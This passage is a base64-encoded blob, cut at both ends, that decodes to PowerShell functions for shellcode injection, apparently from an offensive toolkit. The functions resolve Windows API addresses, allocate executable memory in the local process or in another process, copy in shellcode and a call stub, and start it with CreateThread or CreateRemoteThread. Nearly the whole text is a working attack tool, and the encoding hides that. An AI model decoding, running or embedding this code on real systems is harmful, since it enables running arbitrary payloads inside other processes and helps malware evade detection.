cmFtDQogICAgICAgICgNCiAgICAgICAgICAgIFtPdXRwdXRUeXBlKFtUeXBlXSldDQogICAgICAgICAgICANCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCldDQogICAgICAgICAgICBbVHlwZVtdXQ0KICAgICAgICAgICAgJFBhcmFtZXRlcnMgPSAoTmV3LU9iamVjdCBUeXBlW10oMCkpLA0KICAgICAgICAgICAgDQogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEgKV0NCiAgICAgICAgICAgIFtUeXBlXQ0KICAgICAgICAgICAgJFJldHVyblR5cGUgPSBbVm9pZF0NCiAgICAgICAgKQ0KDQogICAgICAgICREb21haW4gPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbg0KICAgICAgICAkRHluQXNzZW1ibHkgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKQ0KICAgICAgICAkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bkFzc2VtYmx5LCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pDQogICAgICAgICRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkNCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQ0KICAgICAgICAkQ29uc3RydWN0b3JCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJFBhcmFtZXRlcnMpDQogICAgICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpDQogICAgICAgICRNZXRob2RCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJFJldHVyblR5cGUsICRQYXJhbWV0ZXJzKQ0KICAgICAgICAkTWV0aG9kQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykNCiAgICAgICAgDQogICAgICAgIFdyaXRlLU91dHB1dCAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpDQogICAgfQ0KDQogICAgZnVuY3Rpb24gTG9jYWw6R2V0LVByb2NBZGRyZXNzDQogICAgew0KICAgICAgICBQYXJhbQ0KICAgICAgICAoDQogICAgICAgICAgICBbT3V0cHV0VHlwZShbSW50UHRyXSldDQogICAgICAgIA0KICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSApXQ0KICAgICAgICAgICAgW1N0cmluZ10NCiAgICAgICAgICAgICRNb2R1bGUsDQogICAgICAgICAgICANCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUgKV0NCiAgICAgICAgICAgIFtTdHJpbmddDQogICAgICAgICAgICAkUHJvY2VkdXJlDQogICAgICAgICkNCg0KICAgICAgICAjIEdldCBhIHJlZmVyZW5jZSB0byBTeXN0ZW0uZGxsIGluIHRoZSBHQUMNCiAgICAgICAgJFN5c3RlbUFzc2VtYmx5ID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwNCiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfQ0KICAgICAgICAkVW5zYWZlTmF0aXZlTWV0aG9kcyA9ICRTeXN0ZW1Bc3NlbWJseS5HZXRUeXBlKCdNaWNyb3NvZnQuV2luMzIuVW5zYWZlTmF0aXZlTWV0aG9kcycpDQogICAgICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIHRoZSBHZXRNb2R1bGVIYW5kbGUgYW5kIEdldFByb2NBZGRyZXNzIG1ldGhvZHMNCiAgICAgICAgJEdldE1vZHVsZUhhbmRsZSA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0TW9kdWxlSGFuZGxlJykNCiAgICAgICAgJEdldFByb2NBZGRyZXNzID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRQcm9jQWRkcmVzcycpDQogICAgICAgICMgR2V0IGEgaGFuZGxlIHRvIHRoZSBtb2R1bGUgc3BlY2lmaWVkDQogICAgICAgICRLZXJuMzJIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkbnVsbCwgQCgkTW9kdWxlKSkNCiAgICAgICAgJHRtcFB0ciA9IE5ldy1PYmplY3QgSW50UHRyDQogICAgICAgICRIYW5kbGVSZWYgPSBOZXctT2JqZWN0IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWYoJHRtcFB0ciwgJEtlcm4zMkhhbmRsZSkNCiAgICAgICAgDQogICAgICAgICMgUmV0dXJuIHRoZSBhZGRyZXNzIG9mIHRoZSBmdW5jdGlvbg0KICAgICAgICBXcml0ZS1PdXRwdXQgJEdldFByb2NBZGRyZXNzLkludm9rZSgkbnVsbCwgQChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZl0kSGFuZGxlUmVmLCAkUHJvY2VkdXJlKSkNCiAgICB9DQoNCiAgICAjIEVtaXRzIGEgc2hlbGxjb2RlIHN0dWIgdGhhdCB3aGVuIGluamVjdGVkIHdpbGwgY3JlYXRlIGEgdGhyZWFkIGFuZCBwYXNzIGV4ZWN1dGlvbiB0byB0aGUgbWFpbiBzaGVsbGNvZGUgcGF5bG9hZA0KICAgIGZ1bmN0aW9uIExvY2FsOkVtaXQtQ2FsbFRocmVhZFN0dWIgKFtJbnRQdHJdICRCYXNlQWRkciwgW0ludFB0cl0gJEV4aXRUaHJlYWRBZGRyLCBbSW50XSAkQXJjaGl0ZWN0dXJlKQ0KICAgIHsNCiAgICAgICAgJEludFNpemVQdHIgPSAkQXJjaGl0ZWN0dXJlIC8gOA0KDQogICAgICAgIGZ1bmN0aW9uIExvY2FsOkNvbnZlcnRUby1MaXR0bGVFbmRpYW4gKFtJbnRQdHJdICRBZGRyZXNzKQ0KICAgICAgICB7DQogICAgICAgICAgICAkTGl0dGxlRW5kaWFuQnl0ZUFycmF5ID0gTmV3LU9iamVjdCBCeXRlW10oMCkNCiAgICAgICAgICAgICRBZGRyZXNzLlRvU3RyaW5nKCJYJCgkSW50U2l6ZVB0cioyKSIpIC1zcGxpdCAnKFtBLUYwLTldezJ9KScgfCBGb3JFYWNoLU9iamVjdCB7IGlmICgkXykgeyAkTGl0dGxlRW5kaWFuQnl0ZUFycmF5ICs9IFtCeXRlXSAoJzB4ezB9JyAtZiAkXykgfSB9DQogICAgICAgICAgICBbU3lzdGVtLkFycmF5XTo6UmV2ZXJzZSgkTGl0dGxlRW5kaWFuQnl0ZUFycmF5KQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBXcml0ZS1PdXRwdXQgJExpdHRsZUVuZGlhbkJ5dGVBcnJheQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAkQ2FsbFN0dWIgPSBOZXctT2JqZWN0IEJ5dGVbXSgwKQ0KICAgICAgICANCiAgICAgICAgaWYgKCRJbnRTaXplUHRyIC1lcSA4KQ0KICAgICAgICB7DQogICAgICAgICAgICBbQnl0ZVtdXSAkQ2FsbFN0dWIgPSAweDQ4LDB4QjggICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBRV09SRCBSQVgsICZzaGVsbGNvZGUNCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRCYXNlQWRkciAgICAgICAjICZzaGVsbGNvZGUNCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIFJBWA0KICAgICAgICAgICAgJENhbGxTdHViICs9IDB4NkEsMHgwMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgUFVTSCAgQllURSAwDQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHg0OCwweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBRV09SRCBSQVgsICZFeGl0VGhyZWFkDQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkRXhpdFRocmVhZEFkZHIgIyAmRXhpdFRocmVhZA0KICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgUkFYDQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBbQnl0ZVtdXSAkQ2FsbFN0dWIgPSAweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBEV09SRCBFQVgsICZzaGVsbGNvZGUNCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRCYXNlQWRkciAgICAgICAjICZzaGVsbGNvZGUNCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIEVBWA0KICAgICAgICAgICAgJENhbGxTdHViICs9IDB4NkEsMHgwMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgUFVTSCAgQllURSAwDQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhCOCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBEV09SRCBFQVgsICZFeGl0VGhyZWFkDQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkRXhpdFRocmVhZEFkZHIgIyAmRXhpdFRocmVhZA0KICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgRUFYDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIFdyaXRlLU91dHB1dCAkQ2FsbFN0dWINCiAgICB9DQoNCiAgICBmdW5jdGlvbiBMb2NhbDpJbmplY3QtUmVtb3RlU2hlbGxjb2RlIChbSW50XSAkUHJvY2Vzc0lEKQ0KICAgIHsNCiAgICAgICAgIyBPcGVuIGEgaGFuZGxlIHRvIHRoZSBwcm9jZXNzIHlvdSB3YW50IHRvIGluamVjdCBpbnRvDQogICAgICAgICRoUHJvY2VzcyA9ICRPcGVuUHJvY2Vzcy5JbnZva2UoMHgwMDFGMEZGRiwgJGZhbHNlLCAkUHJvY2Vzc0lEKSAjIFByb2Nlc3NBY2Nlc3NGbGFncy5BbGwgKDB4MDAxRjBGRkYpDQogICAgICAgIA0KICAgICAgICBpZiAoISRoUHJvY2VzcykNCiAgICAgICAgew0KICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBvcGVuIGEgcHJvY2VzcyBoYW5kbGUgZm9yIFBJRDogJFByb2Nlc3NJRCINCiAgICAgICAgfQ0KDQogICAgICAgICRJc1dvdzY0ID0gJGZhbHNlDQoNCiAgICAgICAgaWYgKCQ2NGJpdENQVSkgIyBPbmx5IHBlcmZvcm0gdGhlc2VzIGNoZWNrcyBpZiBDUFUgaXMgNjQtYml0DQogICAgICAgIHsNCiAgICAgICAgICAgICMgRGV0ZXJtaW5lIGlzIHRoZSBwcm9jZXNzIHNwZWNpZmllZCBpcyAzMiBvciA2NCBiaXQNCiAgICAgICAgICAgICRJc1dvdzY0UHJvY2Vzcy5JbnZva2UoJGhQcm9jZXNzLCBbUmVmXSAkSXNXb3c2NCkgfCBPdXQtTnVsbA0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoKCEkSXNXb3c2NCkgLWFuZCAkUG93ZXJTaGVsbDMyYml0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFRocm93ICdVbmFibGUgdG8gaW5qZWN0IDY0LWJpdCBzaGVsbGNvZGUgZnJvbSB3aXRoaW4gMzItYml0IFBvd2Vyc2hlbGwuIFVzZSB0aGUgNjQtYml0IHZlcnNpb24gb2YgUG93ZXJzaGVsbCBpZiB5b3Ugd2FudCB0aGlzIHRvIHdvcmsuJw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZWlmICgkSXNXb3c2NCkgIyAzMi1iaXQgV293NjQgcHJvY2Vzcw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlMzIuTGVuZ3RoIC1lcSAwKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlMzIgdmFyaWFibGUhJw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTMyDQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnSW5qZWN0aW5nIGludG8gYSBXb3c2NCBwcm9jZXNzLicNCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgIyA2NC1iaXQgcHJvY2Vzcw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlNjQuTGVuZ3RoIC1lcSAwKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlNjQgdmFyaWFibGUhJw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTY0DQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnVXNpbmcgNjQtYml0IHNoZWxsY29kZS4nDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZWxzZSAjIDMyLWJpdCBDUFUNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGUzMi5MZW5ndGggLWVxIDApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlMzIgdmFyaWFibGUhJw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTMyDQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicNCiAgICAgICAgfQ0KDQogICAgICAgICMgUmVzZXJ2ZSBhbmQgY29tbWl0IGVub3VnaCBtZW1vcnkgaW4gcmVtb3RlIHByb2Nlc3MgdG8gaG9sZCB0aGUgc2hlbGxjb2RlDQogICAgICAgICRSZW1vdGVNZW1BZGRyID0gJFZpcnR1YWxBbGxvY0V4Lkludm9rZSgkaFByb2Nlc3MsIFtJbnRQdHJdOjpaZXJvLCAkU2hlbGxjb2RlLkxlbmd0aCArIDEsIDB4MzAwMCwgMHg0MCkgIyAoUmVzZXJ2ZXxDb21taXQsIFJXWCkNCiAgICAgICAgDQogICAgICAgIGlmICghJFJlbW90ZU1lbUFkZHIpDQogICAgICAgIHsNCiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgc2hlbGxjb2RlIG1lbW9yeSBpbiBQSUQ6ICRQcm9jZXNzSUQiDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIFdyaXRlLVZlcmJvc2UgIlNoZWxsY29kZSBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRSZW1vdGVNZW1BZGRyLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSINCg0KICAgICAgICAjIENvcHkgc2hlbGxjb2RlIGludG8gdGhlIHByZXZpb3VzbHkgYWxsb2NhdGVkIG1lbW9yeQ0KICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkaFByb2Nlc3MsICRSZW1vdGVNZW1BZGRyLCAkU2hlbGxjb2RlLCAkU2hlbGxjb2RlLkxlbmd0aCwgW1JlZl0gMCkgfCBPdXQtTnVsbA0KDQogICAgICAgICMgR2V0IGFkZHJlc3Mgb2YgRXhpdFRocmVhZCBmdW5jdGlvbg0KICAgICAgICAkRXhpdFRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEV4aXRUaHJlYWQNCg0KICAgICAgICBpZiAoJElzV293NjQpDQogICAgICAgIHsNCiAgICAgICAgICAgICMgQnVpbGQgMzItYml0IGlubGluZSBhc3NlbWJseSBzdHViIHRvIGNhbGwgdGhlIHNoZWxsY29kZSB1cG9uIGNyZWF0aW9uIG9mIGEgcmVtb3RlIHRocmVhZC4NCiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJFJlbW90ZU1lbUFkZHIgJEV4aXRUaHJlYWRBZGRyIDMyDQogICAgICAgICAgICANCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0VtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuJw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgIyBCdWlsZCA2NC1iaXQgaW5saW5lIGFzc2VtYmx5IHN0dWIgdG8gY2FsbCB0aGUgc2hlbGxjb2RlIHVwb24gY3JlYXRpb24gb2YgYSByZW1vdGUgdGhyZWFkLg0KICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkUmVtb3RlTWVtQWRkciAkRXhpdFRocmVhZEFkZHIgNjQNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgNjQtYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nDQogICAgICAgIH0NCg0KICAgICAgICAjIEFsbG9jYXRlIGlubGluZSBhc3NlbWJseSBzdHViDQogICAgICAgICRSZW1vdGVTdHViQWRkciA9ICRWaXJ0dWFsQWxsb2NFeC5JbnZva2UoJGhQcm9jZXNzLCBbSW50UHRyXTo6WmVybywgJENhbGxTdHViLkxlbmd0aCwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQ0KICAgICAgICANCiAgICAgICAgaWYgKCEkUmVtb3RlU3R1YkFkZHIpDQogICAgICAgIHsNCiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgdGhyZWFkIGNhbGwgc3R1YiBtZW1vcnkgaW4gUElEOiAkUHJvY2Vzc0lEIg0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBXcml0ZS1WZXJib3NlICJUaHJlYWQgY2FsbCBzdHViIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJFJlbW90ZVN0dWJBZGRyLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSINCg0KICAgICAgICAjIFdyaXRlIDMyLWJpdCBhc3NlbWJseSBzdHViIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeSBzcGFjZQ0KICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkaFByb2Nlc3MsICRSZW1vdGVTdHViQWRkciwgJENhbGxTdHViLCAkQ2FsbFN0dWIuTGVuZ3RoLCBbUmVmXSAwKSB8IE91dC1OdWxsDQoNCiAgICAgICAgIyBFeGVjdXRlIHNoZWxsY29kZSBhcyBhIHJlbW90ZSB0aHJlYWQNCiAgICAgICAgJFRocmVhZEhhbmRsZSA9ICRDcmVhdGVSZW1vdGVUaHJlYWQuSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sIDAsICRSZW1vdGVTdHViQWRkciwgJFJlbW90ZU1lbUFkZHIsIDAsIFtJbnRQdHJdOjpaZXJvKQ0KICAgICAgICANCiAgICAgICAgaWYgKCEkVGhyZWFkSGFuZGxlKQ0KICAgICAgICB7DQogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGxhdW5jaCByZW1vdGUgdGhyZWFkIGluIFBJRDogJFByb2Nlc3NJRCINCiAgICAgICAgfQ0KDQogICAgICAgICMgQ2xvc2UgcHJvY2VzcyBoYW5kbGUNCiAgICAgICAgJENsb3NlSGFuZGxlLkludm9rZSgkaFByb2Nlc3MpIHwgT3V0LU51bGwNCg0KICAgICAgICBXcml0ZS1WZXJib3NlICdTaGVsbGNvZGUgaW5qZWN0aW9uIGNvbXBsZXRlIScNCiAgICB9DQoNCiAgICBmdW5jdGlvbiBMb2NhbDpJbmplY3QtTG9jYWxTaGVsbGNvZGUNCiAgICB7DQogICAgICAgIGlmICgkUG93ZXJTaGVsbDMyYml0KSB7DQogICAgICAgICAgICBpZiAoJFNoZWxsY29kZTMyLkxlbmd0aCAtZXEgMCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGUzMiB2YXJpYWJsZSEnDQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlMzINCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDMyLWJpdCBzaGVsbGNvZGUuJw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGU2NC5MZW5ndGggLWVxIDApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlNjQgdmFyaWFibGUhJw0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTY0DQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyA2NC1iaXQgc2hlbGxjb2RlLicNCiAgICAgICAgfQ0KICAgIA0KICAgICAgICAjIEFsbG9jYXRlIFJXWCBtZW1vcnkgZm9yIHRoZSBzaGVsbGNvZGUNCiAgICAgICAgJEJhc2VBZGRyZXNzID0gJFZpcnR1YWxBbGxvYy5JbnZva2UoW0ludFB0cl06Olplcm8sICRTaGVsbGNvZGUuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQ0KICAgICAgICBpZiAoISRCYXNlQWRkcmVzcykNCiAgICAgICAgew0KICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBzaGVsbGNvZGUgbWVtb3J5IGluIFBJRDogJFByb2Nlc3NJRCINCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2hlbGxjb2RlIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJEJhc2VBZGRyZXNzLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSINCg0KICAgICAgICAjIENvcHkgc2hlbGxjb2RlIHRvIFJXWCBidWZmZXINCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkU2hlbGxjb2RlLCAwLCAkQmFzZUFkZHJlc3MsICRTaGVsbGNvZGUuTGVuZ3RoKQ0KICAgICAgICANCiAgICAgICAgIyBHZXQgYWRkcmVzcyBvZiBFeGl0VGhyZWFkIGZ1bmN0aW9uDQogICAgICAgICRFeGl0VGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgRXhpdFRocmVhZA0KICAgICAgICANCiAgICAgICAgaWYgKCRQb3dlclNoZWxsMzJiaXQpDQogICAgICAgIHsNCiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJEJhc2VBZGRyZXNzICRFeGl0VGhyZWFkQWRkciAzMg0KICAgICAgICAgICAgDQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyAzMi1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJEJhc2VBZGRyZXNzICRFeGl0VGhyZWFkQWRkciA2NA0KICAgICAgICAgICAgDQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyA2NC1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicNCiAgICAgICAgfQ0KDQogICAgICAgICMgQWxsb2NhdGUgUldYIG1lbW9yeSBmb3IgdGhlIHRocmVhZCBjYWxsIHN0dWINCiAgICAgICAgJENhbGxTdHViQWRkcmVzcyA9ICRWaXJ0dWFsQWxsb2MuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAkQ2FsbFN0dWIuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQ0KICAgICAgICBpZiAoISRDYWxsU3R1YkFkZHJlc3MpDQogICAgICAgIHsNCiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgdGhyZWFkIGNhbGwgc3R1Yi4iDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIFdyaXRlLVZlcmJvc2UgIlRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkQ2FsbFN0dWJBZGRyZXNzLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSINCg0KICAgICAgICAjIENvcHkgY2FsbCBzdHViIHRvIFJXWCBidWZmZXINCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkQ2FsbFN0dWIsIDAsICRDYWxsU3R1YkFkZHJlc3MsICRDYWxsU3R1Yi5MZW5ndGgpDQoNCiAgICAgICAgIyBMYXVuY2ggc2hlbGxjb2RlIGluIGl0J3Mgb3duIHRocmVhZA0KICAgICAgICAkVGhyZWFkSGFuZGxlID0gJENyZWF0ZVRocmVhZC5JbnZva2UoW0ludFB0cl06Olplcm8sIDAsICRDYWxsU3R1YkFkZHJlc3MsICRCYXNlQWRkcmVzcywgMCwgW0ludFB0cl06Olplcm8pDQogICAgICAgIGlmICghJFRocmVhZEhhbmRsZSkNCiAgICAgICAgew0KICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBsYXVuY2ggdGhyZWFkLiINCiAgICAgICAgfQ0KDQogICAgICAgICMgV2FpdCBmb3Igc2hlbGxjb2RlIHRocmVhZCB0byB0ZXJtaW5hdGUNCiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3QuSW52b2tlKCRUaHJlYWRIYW5kbGUsIDB4RkZGRkZGRkYpIHwgT3V0LU51bGwNCiAgICAgICAgDQogICAgICAgICRWaXJ0dWFsRnJlZS5JbnZva2UoJENhbGxTdHViQWRkcmVzcywgJENhbGxTdHViLkxlbmd0aCArIDEsIDB4ODAwMCkgfCBPdXQtTnVsbCAjIE1FTV9SRUxFQVNFICgweDgwMDApDQogICAgICAgICRWaXJ0dWFsRnJlZS5JbnZva2UoJEJhc2VBZGRyZXNzLCAkU2hlbGxjb2RlLkxlbmd0aCArIDEsIDB4ODAwMCkgfCBPdXQtTnVsbCAjIE1FTV9SRUxFQVNFICgweDgwMDApDQoNCiAgICAgICAgV3JpdGUtVmVyYm9zZSAnU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEnDQogICAgfQ0KDQogICAgIyBBIHZhbGlkIHBvaW50ZXIgdG8gSXNXb3c2NFByb2Nlc3Mgd2lsbCBiZSByZXR1cm5lZCBpZiBDUFUgaX